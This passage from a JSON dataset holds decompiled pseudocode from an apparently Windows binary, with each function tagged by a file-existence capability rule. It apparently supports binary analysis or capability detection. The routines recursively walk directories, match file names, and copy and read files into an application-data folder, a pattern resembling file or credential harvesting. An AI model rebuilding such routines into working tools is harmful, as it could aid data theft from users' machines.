        "decompiled_code": "\nint32_t __cdecl fcn.00405b50(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char *var_ch;\n    \n    iVar1 = 0;\n    if ((arg_8h != 0) && (iVar1 = fcn.0042b2b1(arg_8h),  iVar1 == 0)) {\n        arg_8h = 0;\n        fcn.0042ac29(&arg_8h);\n        var_ch = \"WSHS4954XGCLRNSRX\";\n        iVar1 = fcn.0042b331(&var_ch, 0x44c6c0);\n    }\n    return iVar1;\n}\n",
        "token_count": 151
    },
    "00408b40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_108h\n\nvoid __cdecl fcn.00408b40(uint arg_8h, uint arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint unaff_ESI;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042bb30(&var_108h, arg_8h);\n    iVar1 = fcn.00408170(*in_ECX, &var_108h, (arg_ch != '\\0') + 1);\n    if (iVar1 == 0) {\n        if (in_ECX[1] != -1) {\n            fcn.00408460(*in_ECX);\n        }\n        in_ECX[1] = -1;\n        arg_8h_00 = *(*in_ECX + 0x10);\n        if (arg_10h != NULL) {\n            *arg_10h = arg_8h_00;\n        }\n        if (arg_14h != NULL) {\n            fcn.004084f0(arg_8h_00, arg_14h);\n        }\n        fcn.0042a75a(unaff_ESI);\n        return;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = 0xffffffff;\n    }\n    if (arg_14h != NULL) {\n        fcn.0042a6e0(arg_14h, 0, 300);\n        *arg_14h = 0xffffffff;\n    }\n    fcn.0042a75a(var_108h);\n    return;\n}\n",
        "token_count": 405
    },
    "0040b610": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b610(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EDI;\n    uint var_450h;\n    uint var_424h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    (**0x462e8c)(&var_310h, 0x446d50, arg_8h, arg_ch);\n    iVar1 = (**0x4630f8)(&var_310h, &var_450h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x463068)(&var_424h, 0x446d4c);\n            if (iVar2 != 0) {\n                iVar2 = (**0x463068)(&var_424h, 0x446d48);\n                if (iVar2 != 0) {\n                    fcn.0042a6e0(&var_20ch, 0, 0x104);\n                    fcn.0042a6e0(&var_108h, 0, 0x104);\n                    (**0x463038)(&var_20ch, 0x446d38);\n                    (**0x463038)(&var_20ch, &var_424h);\n                    (**0x463038)(&var_108h, arg_8h);\n                    (**0x463038)(&var_108h, 0x445308);\n                    (**0x463038)(&var_108h, &var_424h);\n                    fcn.004299c0(*0x45247c, &var_20ch, &var_108h);\n                }\n            }\n            iVar2 = (**0x462f50)(iVar1, &var_450h);\n        } while (iVar2 != 0);\n        (**0x462ec0)(iVar1);\n    }\n    fcn.0042a75a(unaff_EDI);\n    return;\n}\n",
        "token_count": 477
    },
    "0040c390": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c390(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_78ch;\n    uint var_788h;\n    uint var_784h;\n    uint var_780h;\n    uint var_77ch;\n    uint var_775h;\n    uint32_t var_758h;\n    uint var_748h;\n    uint32_t var_744h;\n    uint *var_73ch;\n    uint var_72ch;\n    uint32_t var_728h;\n    uint32_t var_720h;\n    uint var_710h;\n    uint32_t var_70ch;\n    uint var_704h;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43d7b2;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042a6e0(&var_31ch, 0, 0x104, var_10h);\n    fcn.0042a6e0(&var_114h, 0, 0x104);\n    var_77ch = 0;\n    var_780h = 0;\n    uVar1 = fcn.00420a40(0x1a);\n    (**0x463038)(&var_31ch, uVar1);\n    (**0x463038)(&var_31ch, *0x451e78);\n    (**0x463038)(&var_114h, &var_31ch);\n    (**0x463038)(&var_114h, 0x445308);\n    (**0x463038)(&var_114h, *0x451e10);\n    var_70ch = 0xf;\n    var_710h = 0;\n    var_720h = var_720h & 0xffffff00;\n    uVar1 = fcn.0042ad20(&var_114h);\n    fcn.004062a0(&var_114h, uVar1);\n    var_4h = 0;\n    puVar2 = fcn.00423d50(&var_758h, &var_720h);\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (7 < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    iVar3 = fcn.00420980(puVar2);\n    if (7 < var_744h) {\n        fcn.0042a679(var_758h);\n    }\n    var_744h = 7;\n    var_748h = 0;\n    var_758h = var_758h & 0xffff0000;\n    var_4h = 0xffffffff;\n    if (0xf < var_70ch) {\n        fcn.0042a679(var_720h);\n    }\n    if (iVar3 != 0) {\n        iVar3 = fcn.00419dc0(&var_114h, &var_77ch, &var_780h);\n        if (iVar3 != 0) {\n            var_70ch = 0xf;\n            var_710h = 0;\n            var_720h = var_720h & 0xffffff00;\n            uVar4 = fcn.0042ad20(arg_8h);\n            fcn.004062a0(arg_8h, uVar4);\n            var_4h = 2;\n            fcn.00424280(&var_73ch, &var_720h);\n            var_4h._0_1_ = 4;\n            if (0xf < var_70ch) {\n                fcn.0042a679(var_720h);\n            }\n            var_70ch = 0xf;\n            var_710h = 0;\n            var_720h = var_720h & 0xffffff00;\n            fcn.0042a6e0(&var_218h, 0, 0x104);\n            (**0x463038)(&var_218h, *0x451b4c);\n            uVar4 = fcn.0042ad20(&var_218h);\n            iVar3 = fcn.0040b950(&var_218h, 0, uVar4);\n            if (iVar3 != -1) {\n                fcn.00405ac0(0, iVar3 + 0xc);\n                fcn.00405ac0(0x8c, 0xffffffff);\n                puVar2 = var_73ch;\n                if (var_728h < 0x10) {\n                    puVar2 = &var_73ch;\n                }\n                iVar3 = fcn.00415410(puVar2, &var_788h, &var_784h);\n                if (iVar3 != 0) {\n                    fcn.0042a6e0(&var_704h, 0, 1000);\n                    puVar2 = fcn.0041a6a0(&var_758h, var_788h, var_784h, var_77ch, var_780h);\n                    var_4h._0_1_ = 5;\n                    if (0xf < puVar2[5]) {\n                        puVar2 = *puVar2;\n                    }\n                    (**0x463038)(&var_704h, puVar2);\n                    var_4h._0_1_ = 4;\n                    fcn.00405d10();\n                    (**0x463038)(arg_ch, *0x451fd8);\n                    iVar3 = (**0x463068)(&var_704h, 0x446e90);\n                    if (iVar3 != 0) {\n                        puVar2 = fcn.0041a6a0(&var_775h + 1, var_788h, var_784h, var_77ch, var_780h);\n                        var_4h._0_1_ = 6;\n                        if (0xf < puVar2[5]) {\n                            puVar2 = *puVar2;\n                        }\n                        (**0x463038)(arg_ch, puVar2);\n                        var_4h._0_1_ = 4;\n                        fcn.00405d10();\n                    }\n                    (**0x463038)(arg_ch, 0x4452fc);\n                }\n            }\n            var_4h = 0xffffffff;\n            if (0xf < var_728h) {\n                fcn.0042a679(var_73ch);\n            }\n            var_728h = 0xf;\n            var_72ch = 0;\n            var_73ch = var_73ch & 0xffffff00;\n        }\n    }\n    fcn.00415510(&var_77ch, &var_780h);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(uVar1);\n    return;\n}\n",
        "token_count": 1633
    },
    "0040c7d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040c7d0(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch, uint noname_6, \n            uint arg_24h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_564h;\n    uint var_560h;\n    uint var_534h;\n    uint var_420h;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43d7e8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = 0;\n    var_4h = 0;\n    uVar1 = (**0x463094)(0, 9999999, var_10h);\n    var_564h = (**0x46301c)(uVar1);\n    (**0x462e8c)(&var_31ch, 0x446e98, arg_24h);\n    iVar2 = (**0x4630f8)(&var_31ch, &var_560h);\n    if (iVar2 != -1) {\n        do {\n            iVar3 = (**0x463068)(&var_534h, 0x446d4c);\n            if ((iVar3 != 0) && (iVar3 = (**0x463068)(&var_534h, 0x446d48),  iVar3 != 0)) {\n                (**0x462e8c)(&var_420h, 0x446d50, arg_24h, &var_534h);\n                fcn.0042a6e0(&var_114h, 0, 0x104);\n                (**0x463038)(&var_114h, *0x452154);\n                uVar1 = fcn.00420910(0x1a);\n                (**0x463038)(&var_114h, uVar1);\n                (**0x462ee0)(&var_420h, &var_114h, 1);\n                fcn.0040c390(&var_114h, var_564h);\n                (**0x462f3c)(&var_114h);\n            }\n            iVar3 = (**0x462f50)(iVar2, &var_560h);\n        } while (iVar3 != 0);\n        (**0x462ec0)(iVar2);\n        fcn.0042a6e0(&var_218h, 0, 0x104);\n        (**0x463038)(&var_218h, *0x452348);\n        uVar1 = (**0x462f30)(var_564h);\n        fcn.00429a10(*0x45247c, &var_218h, var_564h, uVar1);\n        fcn.0042a6e0(&var_564h, 0, 4);\n    }\n    if (0xf < arg_1ch) {\n        fcn.0042a679(arg_8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 805
    },
    "0040cec0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d214)\n\nvoid __cdecl fcn.0040cec0(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43d818;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    fcn.004061b0(&arg_8h, 0, 0xffffffff);\n    uVar1 = fcn.0042ad20(0x446ec0);\n    fcn.0040b950(0x446ec0, 0, uVar1);\n    uVar1 = fcn.0042ad20(0x446eb0);\n    fcn.0040b950(0x446eb0, 0, uVar1);\n    uVar1 = fcn.0042ad20(0x446ea0);\n    fcn.0040b950(0x446ea0, 0, uVar1);\n    uVar1 = *0x452270;\n    uVar2 = fcn.0042ad20(*0x452270);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x452174;\n    uVar2 = fcn.0042ad20(*0x452174);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x452180;\n    uVar2 = fcn.0042ad20(*0x452180);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451e58;\n    uVar2 = fcn.0042ad20(*0x451e58);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451f10;\n    uVar2 = fcn.0042ad20(*0x451f10);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x452194;\n    uVar2 = fcn.0042ad20(*0x452194);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451c94;\n    uVar2 = fcn.0042ad20(*0x451c94);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x4520d4;\n    uVar2 = fcn.0042ad20(*0x4520d4);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451e14;\n    uVar2 = fcn.0042ad20(*0x451e14);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x452000;\n    uVar2 = fcn.0042ad20(*0x452000);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451f84;\n    uVar2 = fcn.0042ad20(*0x451f84);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x45232c;\n    uVar2 = fcn.0042ad20(*0x45232c);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x4520a8;\n    uVar2 = fcn.0042ad20(*0x4520a8);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x452138;\n    uVar2 = fcn.0042ad20(*0x452138);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451eac;\n    uVar2 = fcn.0042ad20(*0x451eac);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451f80;\n    uVar2 = fcn.0042ad20(*0x451f80);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451c90;\n    uVar2 = fcn.0042ad20(*0x451c90);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451b68;\n    uVar2 = fcn.0042ad20(*0x451b68);\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x451cfc;\n    uVar2 = fcn.0042ad20(*0x451cfc);\n    arg_8h_00 = 0;\n    fcn.0040b950(uVar1, 0, uVar2);\n    uVar1 = *0x452190;\n    uVar2 = fcn.0042ad20(*0x452190);\n    fcn.0040b950(uVar1, 0, uVar2);\n    if (0xf < arg_1ch) {\n        fcn.0042a679(arg_8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1386
    },
    "0040d9e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040d9e0(uchar *arg_8h, int32_t **arg_ch)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    int32_t **var_4h;\n    \n    uVar2 = fcn.0042ad20(0x446edc);\n    iVar3 = fcn.0040ba00(0x446edc, 0, uVar2);\n    uVar2 = fcn.0042ad20(0x446edc);\n    iVar4 = fcn.0040ba70(0x446edc, 0xffffffff, uVar2);\n    piVar1 = arg_ch[5];\n    if (iVar3 == -1) {\n        ppiVar5 = arg_ch;\n        if (0xf < piVar1) {\n            ppiVar5 = *arg_ch;\n        }\n    }\n    else {\n        ppiVar5 = arg_ch;\n        if (0xf < piVar1) {\n            ppiVar5 = *arg_ch;\n        }\n        ppiVar5 = ppiVar5 + iVar3;\n    }\n    if (iVar4 == -1) {\n        if (piVar1 < 0x10) {\n            var_4h = arg_ch[4] + arg_ch;\n        }\n        else {\n            var_4h = arg_ch[4] + *arg_ch;\n        }\n    }\n    else {\n        if (0xf < piVar1) {\n            arg_ch = *arg_ch;\n        }\n        var_4h = arg_ch + iVar4 + 1;\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    if (ppiVar5 != var_4h) {\n        fcn.004062a0(ppiVar5, var_4h - ppiVar5);\n    }\n    return arg_8h;\n}\n",
        "token_count": 465
    },
    "004120d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004120d0(uint arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_564h;\n    uint var_560h;\n    uint var_55ch;\n    uint var_554h;\n    uint var_528h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_20ch, 0, 0x104);\n    arg_8h_00 = fcn.00420a40(0x1a);\n    (**0x463038)(&var_20ch);\n    if (arg_18h == 0) {\n        (**0x462e8c)(&var_414h, 0x447154, &var_20ch, arg_8h, arg_10h);\n    }\n    else {\n        (**0x462e8c)(&var_414h, 0x447160, &var_20ch, arg_8h);\n    }\n    iVar1 = (**0x4630f8)(&var_414h, &var_554h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x463068)(&var_528h, 0x446d4c);\n            if ((iVar2 != 0) && (iVar2 = (**0x463068)(&var_528h, 0x446d48),  iVar2 != 0)) {\n                if (arg_18h == 0) {\n                    (**0x462e8c)(&var_310h, 0x447154, &var_20ch, arg_8h, &var_528h);\n                }\n                else {\n                    (**0x462e8c)(&var_310h, 0x447148, &var_20ch, arg_8h, &var_528h, arg_10h);\n                }\n                iVar2 = fcn.004209b0(&var_310h);\n                if (iVar2 != 0) {\n                    fcn.0042a6e0(&var_108h, 0, 0x104);\n                    (**0x463038)(&var_108h, 0x445308);\n                    (**0x463038)(&var_108h, 0x447144);\n                    (**0x463038)(&var_108h, 0x447140);\n                    (**0x463038)(&var_108h, 0x44713c);\n                    (**0x463038)(&var_108h, 0x44713c);\n                    (**0x463038)(&var_108h, 0x447138);\n                    (**0x463038)(&var_108h, 0x447134);\n                    (**0x463038)(&var_108h, 0x447130);\n                    (**0x463038)(&var_108h, 0x445308);\n                    (**0x463038)(&var_108h, arg_ch);\n                    (**0x463038)(&var_108h, 0x445308);\n                    if (arg_18h == 0) {\n                        puVar3 = &var_528h;\n                    }\n                    else {\n                        (**0x463038)(&var_108h, &var_528h);\n                        (**0x463038)(&var_108h, 0x445308);\n                        puVar3 = arg_10h;\n                    }\n                    (**0x463038)(&var_108h, puVar3);\n                    fcn.004299c0(arg_14h, &var_108h, &var_310h);\n                }\n            }\n            iVar2 = (**0x462f50)(iVar1, &var_554h);\n        } while (iVar2 != 0);\n        (**0x462ec0)(iVar1);\n    }\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 960
    },
    "004123b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004123b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint unaff_EDI;\n    uint *puVar5;\n    uint var_560h;\n    uint var_55ch;\n    uint var_558h;\n    uint var_554h;\n    uint var_528h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar4 = arg_8h;\n    uVar1 = fcn.00420a40(0x1a);\n    (**0x462e8c)(&var_310h, 0x447160, uVar1, uVar4);\n    iVar2 = (**0x4630f8)(&var_310h, &var_554h);\n    if (iVar2 != -1) {\n        do {\n            iVar3 = (**0x463068)(&var_528h, 0x446d4c);\n            if (iVar3 != 0) {\n                iVar3 = (**0x463068)(&var_528h, 0x446d48);\n                if (iVar3 != 0) {\n                    (**0x462e8c)(&var_20ch, 0x446d50, arg_8h, &var_528h);\n                    puVar5 = &var_20ch;\n                    uVar4 = fcn.00420a40(0x1a);\n                    (**0x462e8c)(&var_414h, 0x446d50, uVar4, puVar5);\n                    fcn.0042a6e0(&var_108h, 0, 0x104);\n                    (**0x463038)(&var_108h, 0x445308);\n                    (**0x463038)(&var_108h, 0x447144);\n                    (**0x463038)(&var_108h, 0x447140);\n                    (**0x463038)(&var_108h, 0x44713c);\n                    (**0x463038)(&var_108h, 0x44713c);\n                    (**0x463038)(&var_108h, 0x447138);\n                    (**0x463038)(&var_108h, 0x447134);\n                    (**0x463038)(&var_108h, 0x447130);\n                    (**0x463038)(&var_108h, arg_8h);\n                    (**0x463038)(&var_108h, 0x445308);\n                    (**0x463038)(&var_108h, &var_528h);\n                    fcn.004299c0(arg_14h, &var_108h, &var_414h);\n                    if ((var_554h & 0x10) != 0) {\n                        fcn.004123b0(&var_20ch, arg_ch, arg_10h, arg_14h);\n                    }\n                }\n            }\n            iVar3 = (**0x462f50)(iVar2, &var_554h);\n        } while (iVar3 != 0);\n        (**0x462ec0)(iVar2);\n    }\n    fcn.0042a75a(unaff_EDI);\n    return;\n}\n",
        "token_count": 801
    },
    "004150f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004150f0(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00429e0b(0);\n    iVar1 = *(param_1 + 4);\n    if ((iVar1 != 0) && (iVar1 != -1)) {\n        *(param_1 + 4) = iVar1 + -1;\n    }\n    iVar1 = *(param_1 + 4);\n    fcn.00429e33();\n    return ~-(iVar1 != 0) & param_1;\n}\n",
        "token_count": 133
    },
    "00415140": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415140(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    uVar1 = *param_1;\n    if (uVar1 != 0) {\n        fcn.00429e0b(0);\n        iVar2 = *(uVar1 + 4);\n        if ((iVar2 != 0) && (iVar2 != -1)) {\n            *(uVar1 + 4) = iVar2 + -1;\n        }\n        iVar2 = *(uVar1 + 4);\n        fcn.00429e33();\n        puVar3 = ~-(iVar2 != 0) & uVar1;\n        if (puVar3 != NULL) {\n            (***puVar3)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "004151b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004151b0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = **(in_ECX + 0x30);\n    *arg_8h = iVar1;\n    fcn.00429e0b(0);\n    if (*(iVar1 + 4) != -1) {\n        *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    }\n    fcn.00429e33();\n    return arg_8h;\n}\n",
        "token_count": 137
    },
    "00415370": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.00415370(uint arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = 0;\n    iVar2 = (**0x462ecc)(arg_8h, 0x80000000, 1, 0, 3, 0, 0);\n    if ((iVar2 != 0) && (iVar2 != -1)) {\n        iVar3 = (**0x462e84)(iVar2, &var_ch);\n        if ((iVar3 != 0) && (var_8h == 0)) {\n            *arg_10h = var_ch;\n            iVar3 = (**0x462fe0)(0x40, var_ch);\n            *arg_ch = iVar3;\n            if (iVar3 != 0) {\n                uVar1 = (**0x462ff4)(iVar2, iVar3, *arg_10h, &var_4h, 0);\n                uVar1 = uVar1 & *arg_10h == var_4h;\n                if (uVar1 == 0) {\n                    (**0x4630e0)(*arg_ch);\n                }\n            }\n        }\n        (**0x462ed0)(iVar2);\n    }\n    return uVar1;\n}\n",
        "token_count": 332
    },
    "00416730": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00416730(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *arg_8h_00;\n    uint arg_ch_00;\n    uint *arg_10h_00;\n    uint *arg_14h_00;\n    uint var_35ch;\n    uint var_358h;\n    uint var_354h;\n    uint var_350h;\n    uint var_34ch;\n    uint var_320h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    (**0x462e8c)(&var_20ch, 0x446e98, arg_ch);\n    arg_14h_00 = &var_34ch;\n    arg_10h_00 = &var_20ch;\n    iVar1 = (**0x4630f8)();\n    if (iVar1 != -1) {\n        do {\n            arg_ch_00 = 0x446d4c;\n            arg_8h_00 = &var_320h;\n            iVar2 = (**0x463068)();\n            if ((iVar2 != 0) && (iVar2 = (**0x463068)(&var_320h, 0x446d48),  iVar2 != 0)) {\n                (**0x462e8c)(&var_108h, 0x446d50, arg_ch, &var_320h);\n                iVar2 = (**0x463068)(&var_320h, *0x452018);\n                if (iVar2 == 0) {\n                    fcn.00415f30(&var_108h, arg_8h, arg_10h, arg_14h);\n                }\n                else {\n                    iVar2 = (**0x463068)(&var_320h, *0x451b24);\n                    if (iVar2 == 0) {\n                        fcn.00416520(&var_108h, arg_8h, arg_10h, arg_14h);\n                    }\n                    else {\n                        iVar2 = (**0x463068)(&var_320h, *0x45238c);\n                        if (iVar2 == 0) {\n                            fcn.00415c80(arg_8h, arg_10h, arg_ch, arg_18h);\n                        }\n                        else {\n                            iVar2 = (**0x463068)(&var_320h, *0x451ba8);\n                            if (iVar2 == 0) {\n                                if (*(in_ECX + 2) != '\\0') {\n                                    fcn.00416340(&var_108h, arg_8h, arg_10h, arg_14h);\n                                }\n                            }\n                            else if ((var_34ch & 0x10) == 0) goto code_r0x00416902;\n                        }\n                    }\n                }\n                fcn.00416730(arg_8h_00, arg_ch_00, arg_10h_00, arg_14h_00, unaff_EDI);\n            }\ncode_r0x00416902:\n            iVar2 = (**0x462f50)(iVar1, &var_34ch);\n        } while (iVar2 != 0);\n        (**0x462ec0)(iVar1);\n    }\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 814
    },
    "00416940": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416940(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    uint var_94ch;\n    uint var_948h;\n    uint var_944h;\n    uint var_93ch;\n    uint var_910h;\n    uint var_7fch;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    (**0x462e8c)(&var_414h, 0x446e98, arg_ch);\n    iVar1 = (**0x4630f8)(&var_414h, &var_93ch);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x463068)(&var_910h, 0x446d4c);\n            if ((iVar2 != 0) && (iVar2 = (**0x463068)(&var_910h, 0x446d48),  iVar2 != 0)) {\n                (**0x462e8c)(&var_310h, 0x446d50, arg_ch, &var_910h);\n                iVar2 = (**0x463068)(arg_8h, 0x4452bc);\n                if (iVar2 == 0) {\n                    (**0x462e8c)(&var_20ch, 0x446ed8, &var_910h);\n                }\n                else {\n                    (**0x462e8c)(&var_20ch, 0x446d50, arg_8h, &var_910h);\n                }\n                iVar2 = (**0x462f34)(&var_910h, arg_10h);\n                if (iVar2 != 0) {\n                    fcn.0042a6e0(&var_7fch, 0, 1000);\n                    (**0x463038)(&var_7fch, 0x447340);\n                    (**0x463038)(&var_7fch, arg_14h);\n                    (**0x463038)(&var_7fch, 0x445308);\n                    (**0x463038)(&var_7fch, &var_20ch);\n                    fcn.0042a6e0(&var_108h, 0, 0x104);\n                    (**0x463038)(&var_108h, *0x452154);\n                    uVar3 = fcn.00420910(0x1a);\n                    (**0x463038)(&var_108h, uVar3);\n                    (**0x462ee0)(&var_310h, &var_108h, 1);\n                    fcn.004299c0(*(in_ECX + 0x20), &var_7fch, &var_108h);\n                    (**0x462f3c)(&var_108h);\n                }\n                fcn.00416940(&var_20ch, &var_310h, arg_10h, arg_14h);\n            }\n            iVar2 = (**0x462f50)(iVar1, &var_93ch);\n        } while (iVar2 != 0);\n        (**0x462ec0)(iVar1);\n    }\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 802
    },
    "00418250": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
